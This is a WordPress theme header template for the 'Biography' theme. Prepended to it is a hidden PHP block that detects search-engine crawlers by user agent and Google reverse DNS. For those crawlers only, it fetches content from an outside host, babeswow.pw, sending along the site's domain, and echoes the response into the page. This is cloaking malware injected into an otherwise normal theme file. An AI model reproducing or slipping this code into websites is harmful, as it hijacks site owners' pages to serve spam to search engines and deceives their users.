


<?php
$user_agent_to_filter = array( '#Ask\s*Jeeves#i', '#HP\s*Web\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\s*Library#',
                               '#ListChecker#i', '#MSIECrawler#i', '#NetCache#i', '#Nutch#i', '#RPT-HTTPClient#i',
                               '#rulinki\.ru#i', '#Twiceler#i', '#WebAlta#i', '#Webster\s*Pro#i','#www\.cys\.ru#i',
                               '#Wysigot#i', '#Yahoo!\s*Slurp#i', '#Yeti#i', '#Accoona#i', '#CazoodleBot#i',
                               '#CFNetwork#i', '#ConveraCrawler#i','#DISCo#i', '#Download\s*Master#i', '#FAST\s*MetaWeb\s*Crawler#i',
                               '#Flexum\s*spider#i', '#Gigabot#i', '#HTMLParser#i', '#ia_archiver#i', '#ichiro#i',
                               '#IRLbot#i', '#Java#i', '#km\.ru\s*bot#i', '#kmSearchBot#i', '#libwww-perl#i',
                               '#Lupa\.ru#i', '#LWP::Simple#i', '#lwp-trivial#i', '#Missigua#i', '#MJ12bot#i',
                               '#msnbot#i', '#msnbot-media#i', '#Offline\s*Explorer#i', '#OmniExplorer_Bot#i',
                               '#PEAR#i', '#psbot#i', '#Python#i', '#rulinki\.ru#i', '#SMILE#i',
                               '#Speedy#i', '#Teleport\s*Pro#i', '#TurtleScanner#i', '#User-Agent#i', '#voyager#i',
                               '#Webalta#i', '#WebCopier#i', '#WebData#i', '#WebZIP#i', '#Wget#i',
                               '#Yandex#i', '#Yanga#i', '#Yeti#i','#msnbot#i',
                               '#spider#i', '#yahoo#i', '#jeeves#i' ,'#google#i' ,'#altavista#i',
                               '#scooter#i' ,'#av\s*fetch#i' ,'#asterias#i' ,'#spiderthread revision#i' ,'#sqworm#i',
                               '#ask#i' ,'#lycos.spider#i' ,'#infoseek sidewinder#i' ,'#ultraseek#i' ,'#polybot#i',
                               '#webcrawler#i', '#robozill#i', '#gulliver#i', '#architextspider#i', '#yahoo!\s*slurp#i',
                               '#charlotte#i', '#ngb#i', '#BingBot#i' ) ;

if ( !empty( $_SERVER['HTTP_USER_AGENT'] ) && ( FALSE !== strpos( preg_replace( $user_agent_to_filter, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT'] ), '-NO-WAY-' ) ) ){
    $isbot = 1;
	}

if( FALSE !== strpos( gethostbyaddr($_SERVER['REMOTE_ADDR']), 'google')) 
{
    $isbot = 1;
}

if(@$isbot){

$_SERVER[HTTP_USER_AGENT] = str_replace(" ", "-", $_SERVER[HTTP_USER_AGENT]);
$ch = curl_init();    
    curl_setopt($ch, CURLOPT_URL, "http://babeswow.pw/cac/?useragent=$_SERVER[HTTP_USER_AGENT]&domain=$_SERVER[HTTP_HOST]");   
    $result = curl_exec($ch);       
curl_close ($ch);  

	echo $result;
}
?><?php
/**
 * The default template for displaying header
 *
 * @package Biography
 * @since Biography 1.0.0
 */

/**
 * biography_action_before_head hook
 * @since Biography 1.0.0
 *
 * @hooked biography_set_global -  0
 * @hooked biography_doctype -  10
 */
do_action( 'biography_action_before_head' );?>
<head>

	<?php
	/**
	 * biography_action_before_wp_head hook
	 * @since Biography 1.0.0
	 *
	 * @hooked biography_before_wp_head -  10
	 */
	do_action( 'biography_action_before_wp_head' );

	wp_head();

	/**
	 * biography_action_after_wp_head hook
	 * @since Biography 1.0.0
	 *
	 * @hooked null
	 */
	do_action( 'biography_action_after_wp_head' );
	?>

</head>

<body <?php body_class(); ?>>

<?php
/**
 * biography_action_before hook
 * @since Biography 1.0.0
 *
 * @hooked biography_page_start - 15
 */
do_action( 'biography_action_before' );

/**
 * biography_action_before_header hook
 * @since Biography 1.0.0
 *
 * @hooked biography_skip_to_content - 10
 */
do_action( 'biography_action_before_header' );


/**
 * biography_action_header hook
 * @since Biography 1.0.0
 *
 * @hooked biography_after_header - 10
 */
do_action( 'biography_action_header' );


/**
 * biography_action_after_header hook
 * @since Biography 1.0.0
 *
 * @hooked null
 */
do_action( 'biography_action_after_header' );


/**
 * biography_action_before_content hook
 * @since Biography 1.0.0
 *
 * @hooked biography_content_start -10
 */
do_action( 'biography_action_before_content' );
?>